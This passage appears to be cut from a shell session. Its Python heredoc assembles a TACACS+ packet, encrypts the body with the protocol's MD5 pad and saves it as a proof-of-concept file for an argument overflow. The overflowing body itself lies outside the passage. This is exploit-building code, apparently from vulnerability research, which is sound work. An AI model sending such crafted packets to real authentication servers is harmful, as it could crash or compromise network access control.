hdr=bytearray([0xc0,2,1,0]) + struct.pack('!I',0x12345678) + struct.pack('!I',len(body))
# encrypt since flags=0 and secret set. pad MD5{session_id,key,version,seq_no}, session_id in network byte order from hdr[4:8]

pad=hashlib.md5(pad_input).digest()
enc=bytes(b^pad[i%16] for i,b in enumerate(body))
poc=bytes(hdr)+enc
open('/workspace/poc_tacacs_arg_overflow.bin','wb').write(poc)
print(len(body), poc.hex())
PY
